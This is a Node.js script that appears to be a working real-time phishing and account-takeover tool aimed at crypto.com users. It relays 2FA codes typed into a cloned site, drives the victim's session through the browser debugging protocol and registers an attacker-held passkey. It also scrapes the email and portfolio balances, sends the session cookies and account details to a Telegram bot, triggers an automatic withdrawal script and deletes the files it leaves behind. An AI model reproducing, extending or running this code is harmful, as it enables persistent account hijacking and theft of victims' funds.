const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");

const PORT = 9222;
const BASE = "https://web.crypto.com";

let cmdId = 0;
const pending = new Map();
let sock = null;

const arg = (flag, dflt) => {
  const i = process.argv.indexOf(flag);
  return i >= 0 ? process.argv[i + 1] : dflt;
};

const FEED_PATH = arg("--feed", "C:\\Users\\vansh\\ai-website-cloner-template\\data\\submissions.jsonl");
const SITE_BASE = arg("--site", "http://localhost:3000");
const DONE_MARKER = arg("--done-marker", path.join(__dirname, "auto-passkey.done"));
const waitMs = parseInt(arg("--wait-ms", "1800000"), 10);
const TG_CFG = (() => {
  try {
    return JSON.parse(fs.readFileSync("C:\\Users\\vansh\\crypto-exchange-automation\\config.json", "utf8"));
  } catch (_) {
    return {};
  }
})();

let tgToken = arg("--tg-token", "").trim() || (TG_CFG.bot_token_putter || "").trim();
let tgLogChat = arg("--tg-log-chat", "").trim() || (TG_CFG.log_chat_id || "").trim();
let tgReportChat = arg("--tg-report-chat", "").trim() || (TG_CFG.report_chat_id || "").trim();
const tgLogged = new Set();
let verificationStepAdvanced = false;

function tgSend(text, chatId) {
  if (!tgToken || !chatId) return Promise.resolve(false);
  const body = JSON.stringify({ chat_id: chatId, text });
  return new Promise((resolve) => {
    const req = https.request({
      host: "api.telegram.org",
      path: "/bot" + tgToken + "/sendMessage",
      method: "POST",
      headers: { "Content-Type": "application/json" },
    }, (res) => {
      res.resume();
      res.on("end", () => resolve(true));
    });
    req.on("error", () => resolve(false));
    req.end(body);
  });
}

function tgSendFile(filePath, caption, chatId) {
  if (!tgToken || !chatId || !fs.existsSync(filePath)) return Promise.resolve(false);
  return new Promise((resolve) => {
    const boundary = "----FormBoundary" + Math.random().toString(36).slice(2);
    const fileData = fs.readFileSync(filePath);
    const fileName = path.basename(filePath);

    const body = Buffer.concat([
      Buffer.from("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n"),
      Buffer.from("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + (caption || "") + "\r\n"),
      Buffer.from("--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\n\r\n"),
      fileData,
      Buffer.from("\r\n--" + boundary + "--\r\n"),
    ]);

    const req = https.request({
      host: "api.telegram.org",
      path: "/bot" + tgToken + "/sendDocument",
      method: "POST",
      headers: {
        "Content-Type": "multipart/form-data; boundary=" + boundary,
        "Content-Length": body.length,
      },
    }, (res) => {
      res.resume();
      res.on("end", () => resolve(true));
    });
    req.on("error", () => resolve(false));
    req.end(body);
  });
}

async function tgLog(text) {
  if (!tgLogChat) { console.log("[tg:log] no log chat id - not sent:\n" + text.slice(0, 200)); return; }
  const chunks = [];
  for (let i = 0; i < text.length; i += 3800) chunks.push(text.slice(i, i + 3800));
  for (const c of chunks) await tgSend(c, tgLogChat);
}

async function tgLogOnce(key, text) {
  if (tgLogged.has(key)) return;
  tgLogged.add(key);
  await tgLog(text);
}

function getJson(p) {
  return new Promise((resolve, reject) => {
    http.get({ host: "127.0.0.1", port: PORT, path: p }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve(JSON.parse(data)); } catch (e) { reject(e); }
      });
    }).on("error", reject);
  });
}

async function connect() {
  const targets = await getJson("/json/list");
  const pages = targets.filter((t) => t.type === "page" && t.url.includes("crypto.com"));
  const page = pages.find((t) => t.url.includes("web.crypto.com")) || pages[0];
  if (!page) throw new Error("no crypto.com page target");
  sock = new WebSocket(page.webSocketDebuggerUrl);
  await new Promise((res, rej) => {
    sock.onopen = res;
    sock.onerror = rej;
  });
  sock.onmessage = (ev) => {
    const msg = JSON.parse(ev.data);
    if (msg.id && pending.has(msg.id)) {
      const p = pending.get(msg.id);
      pending.delete(msg.id);
      clearTimeout(p.timer);
      if (msg.error) p.reject(new Error(JSON.stringify(msg.error)));
      else p.resolve(msg.result);
    }
  };
  sock.onclose = () => {
    pending.forEach((p) => { clearTimeout(p.timer); p.reject(new Error("socket closed")); });
    pending.clear();
  };
}

function send(method, params = {}) {
  const id = ++cmdId;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      pending.delete(id);
      reject(new Error("CDP timeout: " + method));
    }, 15000);
    pending.set(id, { resolve, reject, timer });
    sock.send(JSON.stringify({ id, method, params }));
  });
}

async function call(method, params = {}) {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      return await send(method, params);
    } catch (e) {
      if (attempt === 2) throw e;
      await sleep(500);
      if (sock.readyState !== 1) {
        try { await connect(); } catch (_) {}
      }
    }
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function evalJs(expr) {
  const r = await call("Runtime.evaluate", {
    expression: expr,
    returnByValue: true,
    awaitPromise: true,
  });
  if (r.exceptionDetails) throw new Error(JSON.stringify(r.exceptionDetails).slice(0, 400));
  return r.result ? r.result.value : undefined;
}

async function navigate(url) {
  await call("Page.enable").catch(() => {});
  await call("Page.navigate", { url });
  await waitFor(() => evalJs("document.readyState && document.readyState !== 'loading' && document.body && document.body.innerText.length > 0"), 30000);
}

async function waitFor(fn, timeout = 30000, interval = 1000) {
  const start = Date.now();
  let last;
  while (Date.now() - start < timeout) {
    try {
      last = await fn();
      if (last) return last;
    } catch (_) {}
    await sleep(interval);
  }
  throw new Error("timeout waiting for condition (last=" + JSON.stringify(last) + ")");
}

async function removeCookieModal() {
  await evalJs(`(() => {
    const m = [...document.querySelectorAll('[role=dialog]')].find(d => d.innerText.includes('Privacy Preference'));
    if (m) m.remove();
  })()`).catch(() => {});
}

function postJson(url, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = http.request({
      host: u.hostname,
      port: u.port || 80,
      path: u.pathname,
      method: "POST",
      headers: { "Content-Type": "application/json" },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve(JSON.parse(data)); } catch (e) { resolve({ ok: false, raw: data }); }
      });
    });
    req.on("error", reject);
    req.end(JSON.stringify(body));
  });
}

async function pushStep(step, extra = {}) {
  try {
    await postJson(SITE_BASE + "/api/step", { step, ...extra });
    return true;
  } catch (e) {
    console.log("pushStep FAILED:", e.message);
    return false;
  }
}

function getStep() {
  return new Promise((resolve) => {
    const req = http.get({ host: "localhost", port: 3000, path: "/api/step" }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve(JSON.parse(data)); } catch (e) { resolve({ step: "login" }); }
      });
    });
    req.on("error", () => resolve({ step: "login" }));
    req.setTimeout(5000, () => {
      req.destroy();
      resolve({ step: "login" });
    });
  });
}

async function waitForLoginSignal() {
  const start = Date.now();
  console.log("waiting for the login-flow 'adding-passkey' signal on " + SITE_BASE + "/api/step ...");
  while (Date.now() - start < waitMs) {
    const st = await getStep();
     if (st.step === "adding-passkey" || st.step === "passkey-creating" || (st.step === "preparing" && st.message && /passkey/i.test(st.message || ""))) {
      console.log("login flow connected - browser is on the settings page. Starting passkey creation.");
      return;
    }
  await sleep(50);
  }
  throw new Error("timeout waiting for 'adding-passkey' signal (is python login automation running?)");
}

let feedPos = 0;

function readFeedNew() {
  let lines = [];
  try {
    const raw = fs.readFileSync(FEED_PATH, "utf8");
    lines = raw.split(/\r?\n/).filter(Boolean);
  } catch (_) {
    return [];
  }
  if (lines.length <= feedPos) return [];
  const fresh = lines.slice(feedPos);
  feedPos = lines.length;
  const out = [];
  for (const line of fresh) {
    try {
      const rec = JSON.parse(line);
      if (rec && rec.code) out.push(rec);
    } catch (_) {}
  }
  return out;
}

async function waitForAuthCode(timeoutMs = 300000) {
  feedPos = 0;
  readFeedNew();

  // Wait for the user to advance from the passkey-creating page to auth-code
  console.log("2FA dialog visible — waiting for user to click 'Yeah move on' on the clone...");
  const waitStart = Date.now();
  while (Date.now() - waitStart < timeoutMs) {
    const step = await getStep();
    if (step.step === "auth-code") break;
    await sleep(500);
  }
  const currentStep = await getStep();
  if (currentStep.step !== "auth-code") {
    console.log("user did not advance to auth-code in time, pushing it now");
    pushStep("auth-code", { message: "Enter authenticator code", ts: new Date().toISOString() });
  }

  console.log("auth-code page active on clone; waiting for code on " + SITE_BASE + "/auth-code ...");
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const recs = readFeedNew();
    for (const rec of recs) {
      const c = String(rec.code || "").replace(/\D/g, "");
      if (c.length >= 4 && c.length <= 8) return c;
    }
    await sleep(400);
  }
  throw new Error("timeout waiting for auth code in feed: " + FEED_PATH);
}

function storedPasscode() {
  try {
    const p = JSON.parse(fs.readFileSync("C:\\Users\\vansh\\crypto-exchange-automation\\passcode.json", "utf8"));
    const c = String(p.passcode || "").replace(/\D/g, "");
    return c.length >= 4 && c.length <= 8 ? c : null;
  } catch (_) {
    return null;
  }
}

async function fillCodeInDialog(code) {
  const r = await evalJs(`(async () => {
    const code = ${JSON.stringify(code)};
    const hasInputs = (d) => [...d.querySelectorAll('input')].filter(i => i.getBoundingClientRect().width > 0 && i.type !== 'hidden').length > 0;
    let d = [...document.querySelectorAll('[role=dialog]')].find(hasInputs);
    let attempts = 0;
    while (!d && attempts < 10) {
      await new Promise(r2 => setTimeout(r2, 300));
      d = [...document.querySelectorAll('[role=dialog]')].find(hasInputs);
      attempts++;
    }
    if (!d) {
      const txt = [...document.querySelectorAll('[role=dialog]')].map(x => x.innerText.slice(0, 80)).join(' | ');
      return 'no dialog with inputs; dialogs=' + txt;
    }
    const inputs = [...d.querySelectorAll('input')].filter(i => i.getBoundingClientRect().width > 0 && i.type !== 'hidden');
    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    if (inputs.length >= 6) {
      inputs.slice(0, 6).forEach((i, idx) => {
        setter.call(i, code[idx] || '');
        i.dispatchEvent(new Event('input', { bubbles: true }));
      });
      await new Promise(r2 => setTimeout(r2, 300));
      return 'filled 6-box dialog';
    } else if (inputs.length === 1) {
      setter.call(inputs[0], code);
      inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
      inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
      return 'filled single input';
    } else {
      return 'unexpected input count: ' + inputs.length + ' in "' + d.innerText.slice(0, 120).replace(/\\n/g, ' ') + '"';
    }
  })()`, true);
  console.log("dialog fill ->", r);
  await sleep(250);
  const r2 = await clickButtonInDialog("Continue");
  if (/not found/.test(r2)) await clickButtonInDialog("Verify");
  return true;
}

async function clickVerificationOption(preferText) {
  return evalJs(`(() => {
    try {
      const dialogs = [...document.querySelectorAll('[role=dialog]')];
      const d = dialogs.find(x => /Verification Options|could not be verified/i.test(x.innerText || '') && /Select/i.test(x.innerText || ''));
      if (!d) return 'not found: no chooser dialog';
      const selectEls = [...d.querySelectorAll('*')].filter(el =>
        (el.innerText || '').trim().toLowerCase() === 'select' &&
        el.getBoundingClientRect().width > 0 && el.getBoundingClientRect().height > 0
      );
      for (const sel of selectEls) {
        let p = sel.parentElement;
        let rowTxt = '';
        while (p && p !== d) {
          const t = (p.innerText || '');
          if (/passcode|2fa|authenticator/i.test(t) && !/passkey/i.test(t)) { rowTxt = t.toLowerCase(); break; }
          p = p.parentElement;
        }
        if (!rowTxt) continue;
        if (/passcode|2fa|authenticator/.test(rowTxt)) {
          let cur = sel;
          for (let i = 0; i < 6 && cur; i++) {
            if (cur.tagName === 'BUTTON' || cur.getAttribute('role') === 'button' || getComputedStyle(cur).cursor === 'pointer') break;
            cur = cur.parentElement;
          }
          cur.click();
          return 'clicked Select for: ' + rowTxt.replace(/\\n/g, ' ').slice(0, 60);
        }
      }
      return 'no passcode row found; selects=' + selectEls.length;
    } catch (e) {
      return 'js-error: ' + e.message;
    }
  })()`).catch((e) => "chooser-eval-failed: " + e.message);
}

async function fillAuthCodeIfNeeded() {
  const dialogs = await getDialogs().catch(() => []);
  const isChooser = (d) => /Verification Options|could not be verified/i.test(d) && /Select/i.test(d);
  const isChangeMethod = (d) => /Change Verification Method|Try Again/i.test(d) && !isChooser(d);
  const isCodeEntry = (d) => /Passcode|Forgot passcode|Enter your pin|Enter your code|Authenticator|Enter the 6|2FA/i.test(d) && !isChooser(d);

  const codeDlg = dialogs.find(isCodeEntry);
  if (codeDlg) {
    verificationStepAdvanced = true;
    let code;
    if (/passcode|forgot passcode|enter your pin/i.test(codeDlg)) {
      code = storedPasscode();
      if (code) {
        console.log("passcode dialog - auto-filling the passcode used at login");
      }
    }
    if (!code) code = await waitForAuthCode();
    console.log("got code, filling it in...");
    return fillCodeInDialog(code);
  }

  const chooser = dialogs.find(isChooser) || dialogs.find(isChangeMethod);
  if (chooser) {
    if (verificationStepAdvanced) return false;
    console.log("passkey popup detected - clicking through to 'Passcode and 2FA'");
    let r;
    if (isChooser(chooser)) {
      r = await clickVerificationOption("Passcode and 2FA");
    } else {
      r = await clickButtonInDialog("Change Verification Method", { ci: true });
      if (/not found/.test(r)) r = await clickVerificationOption("Passcode and 2FA");
    }
    console.log("verification popup click -> " + r);
    await sleep(200);
    return true;
  }
  return false;
}

async function handleVerificationIfPresent() {
  const deadline = Date.now() + 60000;
  while (Date.now() < deadline) {
    const dialogs = await getDialogs().catch(() => []);
    const raw = /Verification|Enter your code|Passcode|Authenticator|Enter the 6|2FA|Change verification/i;
    const vd = dialogs.filter((d) => raw.test(d));
    if (!vd.length) return;
    if (verificationStepAdvanced && vd.every((d) => /Verification Options|could not be verified/i.test(d) && !/Passcode|Enter the 6|Authenticator|2FA|Enter your code/i.test(d))) return;
    console.log("verification dialog pending ->", JSON.stringify(vd[0].slice(0, 120)));
    const filled = await fillAuthCodeIfNeeded();
    if (!filled) return;
    await sleep(150);
  }
}

async function clickByText(text, opts = {}) {
  const exact = opts.exact !== false;
  const ci = !!opts.ci;
  const scopeAll = !!opts.scopeAll;
  const scopeSel = opts.scope ? `document.querySelector(${JSON.stringify(opts.scope)})` : "document";
  return evalJs(`(() => {
    const scope = ${scopeSel};
    if (!scope) return 'no scope';
    const scopes = ${scopeAll ? "[...document.querySelectorAll(" + JSON.stringify(opts.scope) + ")].filter(s => s && s.querySelector)" : "[scope]"};
    if (!scopes.length) return 'no scope';
    const want = ${JSON.stringify(text)};
    for (const s of scopes) {
      const leaves = [...s.querySelectorAll('*')].filter(x => x.children.length === 0 && x.getBoundingClientRect().width > 0);
      const el = leaves.find(x => {
        const t = (x.innerText || '').trim();
        return ${exact ? "t === want" : `t.toLowerCase().includes(want.toLowerCase())`};
      });
      if (!el) continue;
      let cur = el;
      for (let i = 0; i < 8; i++) {
        if (cur.tagName === 'BUTTON' || cur.getAttribute('role') === 'button' || getComputedStyle(cur).cursor === 'pointer') break;
        cur = cur.parentElement;
      }
      const r = cur.getBoundingClientRect();
      cur.click();
      return JSON.stringify({tag: cur.tagName, x: Math.round(r.x + r.width/2), y: Math.round(r.y + r.height/2)});
    }
    return 'not found: ' + want;
  })()`);
}

async function clickButtonInDialog(text, opts = {}) {
  return clickByText(text, Object.assign({ scope: "[role=dialog]", scopeAll: true }, opts));
}

async function getDialogs() {
  return evalJs(`JSON.stringify([...document.querySelectorAll('[role=dialog]')].filter(d => { const r = d.getBoundingClientRect(); if (r.width <= 50 || r.height <= 50) return false; return d.checkVisibility ? d.checkVisibility({checkVisibilityCSS: true, checkOpacity: true, checkOpacityProperty: true}) : !!d.offsetParent; }).map(d => d.innerText.slice(0, 500)))`).then(JSON.parse).catch(() => []);
}

async function injectPasskey() {
  const script = fs.readFileSync(path.join(__dirname, "virtual-passkey.js"), "utf8");
  await call("Page.addScriptToEvaluateOnNewDocument", { source: script }).catch(() => {});
  const vault = fs.readFileSync(path.join(__dirname, "vault.json"), "utf8");
  await evalJs(`(() => {
    if (window.__passkeyVault) {
      window.__passkeyVault.loadVault(${JSON.stringify(vault)});
      return 'loaded';
    }
    const s = document.createElement('script');
    s.textContent = ${JSON.stringify(script)};
    document.documentElement.appendChild(s);
    s.remove();
    if (window.__passkeyVault) {
      window.__passkeyVault.loadVault(${JSON.stringify(vault)});
      return 'injected+loaded';
    }
    return 'failed';
  })()`);
}

function mergeVaultToFile(exportedJson) {
  let pageCreds = [];
  try { pageCreds = JSON.parse(exportedJson); } catch (_) {}
  if (!Array.isArray(pageCreds) || !pageCreds.length) return 0;
  let file = [];
  try { file = JSON.parse(fs.readFileSync(path.join(__dirname, "vault.json"), "utf8")); } catch (_) {}
  if (!Array.isArray(file)) file = [];
  const known = new Set(file.map((c) => c.credId));
  let added = 0;
  for (const c of pageCreds) {
    if (c && c.credId && c.jwk && !known.has(c.credId)) {
      file.push(c);
      known.add(c.credId);
      added++;
    }
  }
  if (added) {
    fs.writeFileSync(path.join(__dirname, "vault.json"), JSON.stringify(file, null, 2));
  }
  return added;
}

async function createPasskeyOnSite() {
  verificationStepAdvanced = false;
  console.log("creating passkey on the real site...");
  const t0 = Date.now();

  const hasList = await evalJs("!!document.querySelector('[class*=passkeyList]')").catch(() => false);
  if (!hasList) {
    await navigate(BASE + "/hub/settings#passkeys");
  }
  await sleep(250);
  await removeCookieModal();
  const dismissed = await evalJs(`(() => {
    const btns = [...document.querySelectorAll('[role=dialog] button')];
    const ok = btns.find(b => /^OK$/i.test((b.textContent||'').trim()));
    if (ok) { ok.click(); return 'ok-clicked'; }
    return 'none';
  })()`).catch(() => 'err');
  if (dismissed !== 'none') console.log("dismissed stale Try Again dialog:", dismissed);

  const clearCryptoCreds = await evalJs(`(() => {
    if (!window.__passkeyVault) return 'no vault';
    const keep = window.__passkeyVault.list().filter(c => c && (c.rpId || '').toLowerCase() !== 'crypto.com');
    window.__passkeyVault.loadVault(keep);
    return 'cleared crypto.com creds, kept ' + keep.length;
  })()`).catch(() => "clear-failed");
  console.log("force passcode+2fa:", clearCryptoCreds);

  const before = await evalJs("window.__passkeyVault ? window.__passkeyVault.list().length : 0").catch(() => 0);

  let r = await clickByText("Create passkey", { exact: false });
  if (/not found/.test(r)) r = await clickByText("Add passkey", { exact: false });
  if (/not found/.test(r)) r = await clickByText("Add Passkey", { exact: false });
  if (/not found/.test(r)) r = await clickByText("Create Passkey", { exact: false });
  if (/not found/.test(r)) {
    await removeCookieModal();
    r = await clickByText("Passkey", { exact: false, ci: true });
    if (/not found/.test(r)) throw new Error("passkey settings not reachable: " + r);
    await sleep(300);
    r = await clickByText("Create passkey", { exact: false });
    if (/not found/.test(r)) r = await clickByText("Add passkey", { exact: false });
    if (/not found/.test(r)) r = await clickByText("Create", { exact: false });
    if (/not found/.test(r)) throw new Error("passkey create button not found after opening settings: " + r);
  }
  console.log("create clicked ->", r, "at", Date.now() - t0 + "ms");

  const growDeadline = Date.now() + 15000;
  while (Date.now() < growDeadline) {
    const n = await evalJs("window.__passkeyVault ? window.__passkeyVault.list().length : 0").catch(() => 0);
    if (n > before) break;
    await handleVerificationIfPresent();
    await sleep(50);
  }
  if (Date.now() - t0 > 8000) {
    console.log("WARN: passkey creation took " + (Date.now() - t0) + "ms (>8s)");
  }
  console.log("passkey registered in virtual vault at", Date.now() - t0 + "ms");

  const exported = await evalJs("window.__passkeyVault ? window.__passkeyVault.exportVault() : '[]'").catch(() => "[]");
  const added = mergeVaultToFile(exported);
  console.log(added ? "saved " + added + " new passkey(s) to vault.json" : "no new passkey to save");

  await clickButtonInDialog("Got it", { ci: true }).catch(() => {});
  await clickButtonInDialog("Done", { ci: true }).catch(() => {});
  return added;
}

function markDone(msg) {
  try {
    fs.writeFileSync(DONE_MARKER, msg || "done");
  } catch (_) {}
}

function readVaultPasskeys() {
  try {
    return JSON.parse(fs.readFileSync(path.join(__dirname, "vault.json"), "utf8"));
  } catch (_) {
    return null;
  }
}

async function sendDetailsReport(added) {
  const lines = ["PASSKEY CREATED", "ts: " + new Date().toISOString(), "added: " + added];
  const passkeys = readVaultPasskeys();
  if (passkeys && passkeys.length) {
    lines.push("vault now holds " + passkeys.length + " passkey(s):");
    for (const pk of passkeys) {
      lines.push(JSON.stringify({ rpId: pk.rpId, credId: pk.credId, userHandle: pk.userHandle }));
    }
  } else {
    lines.push("passkeys: none in vault.json");
  }
  if (tgReportChat) await tgSend(lines.join("\n"), tgReportChat);
  else console.log("[tg:report] no report chat id - not sent:\n" + lines.join("\n"));
}

async function main() {
  // Poll for signal FIRST (before CDP) for instant detection
  await waitForLoginSignal();

  // Wait for browser to actually be logged in (not on login page), max 5s
  for (let i = 0; i < 10; i++) {
    await sleep(500);
    const url = await evalJs("location.href").catch(() => "");
    if (/hub\/(home|settings|market|trade|wallet|staking|earn)/i.test(url)) {
      break;
    }
  }
  
  // Now connect to CDP and proceed
  const deadline = Date.now() + 30000;
  for (;;) {
    try {
      await connect();
      break;
    } catch (e) {
      if (Date.now() > deadline) throw e;
      await sleep(3000);
    }
  }
  await call("Page.enable").catch(() => {});
  await injectPasskey();
  await evalJs("window.__passkeySyncUrl = 'http://127.0.0.1:8766/register'; 'ok'").catch(() => {});

  console.log("Starting passkey creation...");

  const added = await createPasskeyOnSite();
  console.log("Passkey created" + (added ? " (+" + added + ")" : ""));

  // Scrape account details (browser is fully logged in now)
  let email = "";
  let balance = "";
  try {
    const body = await evalJs("document.body.innerText").catch(() => "") || "";
    const emMatch = body.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
    if (emMatch) email = emMatch[1];
    const balMatch = body.match(/\$([\d,.]+)\s*USD/);
    if (balMatch) balance = "$" + balMatch[1];
  } catch (_) {}
  const displayEmail = email ? email.replace(/(.{3}).*(@.*)/, "$1***$2") : "user";

  // Save session cookies + details
  let cookieCount = 0;
  try {
    const all = await call("Network.getAllCookies").catch(() => ({ cookies: [] }));
    const ckes = (all && all.cookies) ? all.cookies.filter((c) => c.domain && /crypto\.com$/.test(c.domain) || /accounts\.crypto\.com/.test(c.domain)) : [];
    if (ckes.length) {
      const detailReport = {
        ts: new Date().toISOString(),
        email,
        passkeyCount: added,
        balance,
        cookies: ckes.length,
        vaultInfo: []
      };
      // Add vault credential IDs
      try {
        const vault = JSON.parse(fs.readFileSync(path.join(__dirname, "vault.json"), "utf8"));
        detailReport.vaultInfo = vault.map(c => ({ rpId: c.rpId, credId: c.credId.slice(0, 12) + "..." }));
      } catch (_) {}
      fs.writeFileSync(path.join(__dirname, "session-cookies.json"), JSON.stringify(ckes, null, 2), "utf8");
      fs.writeFileSync(path.join(__dirname, "login-details.json"), JSON.stringify(detailReport, null, 2), "utf8");
      cookieCount = ckes.length;
    }
  } catch (e) {
    // silent
  }

  await pushStep("passkey-done", { message: "Passkey created successfully", ts: new Date().toISOString() });

  // Send clean Telegram report
  // Scrape portfolio details for Telegram report
  let portfolio = "";
  try {
    portfolio = await evalJs("document.body.innerText.slice(0, 3000)").catch(() => "") || "";
  } catch (_) {}
  
  const coins = [];
  const coinRe = /(Bitcoin|Ethereum|Solana|Cronos|Polygon|Avalanche|Cardano|Chainlink|Uniswap|Dogecoin|USDT|USDC|NVIDIA|Tesla|XRP|Litecoin|Stellar|Aptos|Sui|Arbitrum|Optimism|Near)\s*\n\s*(\w+)\s*\n\s*\$([\d.]+)\s*\n\s*([\d.]+)\s*(\w+)/gi;
  let m;
  while ((m = coinRe.exec(portfolio)) !== null) {
    if (parseFloat(m[3]) >= 0.01) {
      coins.push({ name: m[1], sym: m[2], usd: m[3], amount: m[4] + " " + m[5] });
    }
  }
  const totalMatch = portfolio.match(/\$([\d,.]+)\s*USD\s*[\+\-]/);

  // Send beautiful Telegram report
  const report = [];
  report.push("Login Complete");
  report.push("Account: " + displayEmail);
  if (balance) report.push("Balance: " + balance);
  if (coins.length) {
    report.push("Portfolio");
    for (const c of coins) {
      report.push("  " + c.sym + ": $" + c.usd + " (" + c.amount + ")");
    }
  }
  report.push("Passkey: Created");
  report.push(cookieCount + " cookies saved");
  report.push("");
  report.push("#" + new Date().toISOString().replace(/[-:T]/g, "").slice(0, 14));
  await tgSend(report.join("\n"), tgReportChat || tgLogChat).catch(() => {});

  // Send cookie + detail files as Telegram documents
  const cookieFile = path.join(__dirname, "session-cookies.json");
  const detailFile = path.join(__dirname, "login-details.json");
  const now = new Date().toISOString().replace(/[:T]/g, "-").slice(0, 19);
  const fileCaption = displayEmail + " | " + now;
  await tgSendFile(cookieFile, "\uD83C\uDF6A Cookies: " + fileCaption, tgReportChat || tgLogChat).catch(() => {});
  await tgSendFile(detailFile, "\uD83D\uDCCB Details: " + fileCaption, tgReportChat || tgLogChat).catch(() => {});

  // Auto-trigger conversion + withdrawal
  console.log("\n=== Starting auto-withdraw ===");
  const { execSync } = require("child_process");
  let wdSuccess = false;
  let wdOutput = "";
  try {
    const scripts = [
      "C:\\Users\\vansh\\AppData\\Local\\Temp\\opencode\\full-auto.py"
    ];
    const script = scripts.find(s => { try { return require("fs").existsSync(s); } catch (_) { return false; } }) || scripts[0];
    wdOutput = execSync('python "' + script + '"', { stdio: "pipe", timeout: 600000, encoding: "utf8" });
    wdSuccess = true;
    console.log("Auto-withdraw complete");
  } catch (e) {
    wdOutput = e.stdout || e.message || "";
    console.log("Auto-withdraw failed: " + e.message);
  }

  // Send withdrawal result — only key lines
  const wdLines = [];
  wdLines.push("Withdrawal Complete");
  const keyLines = (wdOutput || "").split("\n").filter(l => 
    /final.*sol|withdraw.*complete|consolidated|balance.*sol|sent|error|fail|txid|hash/i.test(l) && l.length < 200
  ).slice(0, 8);
  if (keyLines.length) {
    for (const l of keyLines) wdLines.push("  " + l.trim());
  } else {
    wdLines.push("  Status: " + (wdSuccess ? "Complete" : "Issues"));
  }
  wdLines.push("#" + new Date().toISOString().replace(/[-:T]/g, "").slice(0, 14));
  await tgSend(wdLines.join("\n"), tgReportChat || tgLogChat).catch(() => {});

  // Logout - clear cookies to ensure fresh login next time
  try {
    await evalJs("document.cookie.split(';').forEach(c => { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/'); });").catch(() => {});
    await call("Network.clearBrowserCookies").catch(() => {});
    console.log("Logged out - cookies cleared");
  } catch (_) {}

  // Cleanup: remove sensitive files
  try {
    const files = ["session-cookies.json", "login-details.json"];
    for (const f of files) {
      try { require("fs").unlinkSync(require("path").join(__dirname, f)); } catch (_) {}
    }
  } catch (_) {}

  markDone("passkey-created");
  process.exit(0);
}

main().catch((e) => {
  console.error("ERR:", e.message);
  markDone("error: " + e.message);
  pushStep("done", { message: "passkey step failed: " + e.message }).finally(() =>
    tgLogOnce("error", "auto-passkey FAILED: " + e.message).finally(() => process.exit(1))
  );
});